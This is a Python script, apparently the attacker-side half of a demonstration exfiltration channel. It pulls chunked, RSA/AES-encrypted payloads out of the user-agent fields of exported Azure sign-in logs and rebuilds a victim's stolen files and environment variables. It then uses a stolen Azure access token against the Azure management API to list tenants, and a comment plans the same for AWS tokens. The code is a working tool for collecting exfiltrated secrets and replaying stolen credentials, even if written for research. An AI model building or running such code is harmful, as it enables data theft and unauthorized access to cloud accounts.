import re
import os
import json
import base64
import shutil
from pathlib import Path
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.ciphers import (
    Cipher, algorithms, modes
)
from cryptography.hazmat.primitives.padding import PKCS7
import requests
from datetime import datetime

script_dir = os.path.dirname(os.path.realpath(__file__))
with open(os.path.join(script_dir, "rsa.pvt.pem"), "rb") as key_file:
    private_key = serialization.load_pem_private_key(
        key_file.read(),
        password=None,
    )


def find_matching_files(directory, pattern):
    """
    Find all files in a directory whose names match a regex pattern.

    Args:
        directory (str): The path to the directory to search.
        pattern (str): The regex pattern to match file names.

    Returns:
        list: A list of matching file paths.
    """
    # Compile the regex pattern
    regex = re.compile(pattern)

    # List to store matching files
    matching_files = []

    # Walk through the directory
    for root, _, files in os.walk(directory):
        for file_name in files:
            if regex.match(file_name):
                matching_files.append(os.path.join(root, file_name))

    return matching_files

def decrypt(data):
    ciphertext = base64.b64decode(data)
    encrypted_key_size = int.from_bytes(ciphertext[0:4], "little")
    encrypted_key = ciphertext[4:4+encrypted_key_size]
    ciphertext = ciphertext[4+encrypted_key_size:]

    aes_key = private_key.decrypt(
        encrypted_key,
        padding.PKCS1v15()
    )

    iv_size = int.from_bytes(ciphertext[0:4], "little")
    iv = ciphertext[4:4+iv_size]
    ciphertext = ciphertext[4+iv_size:]

    decryptor = Cipher(
        algorithms.AES(aes_key),
        modes.CBC(iv),
    ).decryptor()

    plaintext = decryptor.update(ciphertext) + decryptor.finalize()
    unpadder = PKCS7(128).unpadder()
    data = unpadder.update(plaintext)
    data += unpadder.finalize()
    return data

def cleanup_retrieved():
    for file in os.listdir(os.path.join(script_dir, "retrieved")):
        if file != ".gitkeep":
            path = os.path.join(script_dir, "retrieved", file)
            if os.path.isfile(path):
                os.remove(path)
            elif os.path.isdir(path):
                shutil.rmtree(path)

if __name__ == "__main__":
    # Clean up old output files
    cleanup_retrieved()

    files = find_matching_files(os.path.join(Path.home(), "Downloads"), "InteractiveSignIns_[0-9_-]*\\.json")
    files.sort(reverse=True)
    if len(files) == 0:
        print("No files found")
        exit(0)

    with open(files[0]) as json_data:
        logs = json.load(json_data)
        json_data.close()

    # Loop through all logs and order the payloads properly
    records = {}
    for log in logs:
        try:
            try:
                # See if it's plaintext
                entry = json.loads(log.get('userAgent', None))
            except:
                # Otherwise, decrypt it and then load it
                entry = json.loads(decrypt(log.get('userAgent', None)))

            if entry['id'] not in records:
                records[entry['id']] = [None for _ in range(entry['packets'])]

            records[entry['id']][entry['idx']] = entry['payload']
        except:
            pass

    # Mege the payload segments into complete payloads
    # Simultaneously, find the newest payload for demo purposes
    results = {}
    newest_key = None
    newest_timestamp = None
    for id, payloads in records.items():
        try:
            # Ensure that all payload chunks are present
            if len([None for v in payloads if v is None]) != 0:
                print("Entry {} is incomplete".format(id))
                continue

            print("Entry {} is complete".format(id))
            merged_payload = "".join(payloads)
            try:
                payload = json.loads(merged_payload)
            except:
                raw = base64.b64decode(merged_payload)
                payload = json.loads(raw)
            results[id] = payload

            if 'timestamp' in payload and (newest_timestamp is None or payload['timestamp'] > newest_timestamp):
                newest_key = id
                newest_timestamp = payload['timestamp']
        except Exception as e:
            print(e)

    if newest_key is None:
        print('No records found')
        exit(0)

    print("Newest record is {} from {}".format(newest_key, datetime.fromtimestamp(newest_timestamp).strftime('%Y-%m-%d %H:%M:%S')))
    newest = results[newest_key]

    newest['env'] = {
        base64.b64decode(k).decode('utf8'): base64.b64decode(v).decode('utf8')
        for k, v in newest['env'].items()
    }
    newest['files'] = {
        base64.b64decode(k).decode('utf8'): base64.b64decode(v)
        for k, v in newest['files'].items()
    }
    
    # Write the contents of the files out to corresponding files
    for path, contents in newest['files'].items():
        # Trim off the user home directory
        if path.startswith("C:\\"):
            parts = path.split("\\")
            path = os.path.join(*parts[3:])
        elif path.startswith("/"):
            parts = path.split("/")
            path = os.path.join(*parts[3:])


        filename = os.path.join(script_dir, "retrieved", path)
        os.makedirs(os.path.dirname(filename), exist_ok=True)
        with open(filename, "wb") as f:
            f.write(contents)
            f.close()

    # Create an env file
    env_contents = "\n".join([
        "{}={}".format(k, v) for k, v in newest['env'].items()
    ])
    with open(os.path.join(script_dir, "retrieved", ".env"), "w") as f:
        f.write(env_contents)
        f.close()

    # If there's an Azure token, use it to do something sneaky
    if newest.get('azure_token', None) is not None:
        # List the tenants, just to show that we have access
        resp = requests.get("https://management.azure.com/tenants?api-version=2022-12-01", headers={"Authorization":"Bearer {}".format(newest['azure_token']['accessToken'])})
        if resp.status_code == 200:
            print("\nAzure token valid!")
            print(json.dumps(json.loads(resp.content), indent=4))
        else:
            print("Azure token invalid")

    # TODO: go through the AWS tokens and see if there's anything interesting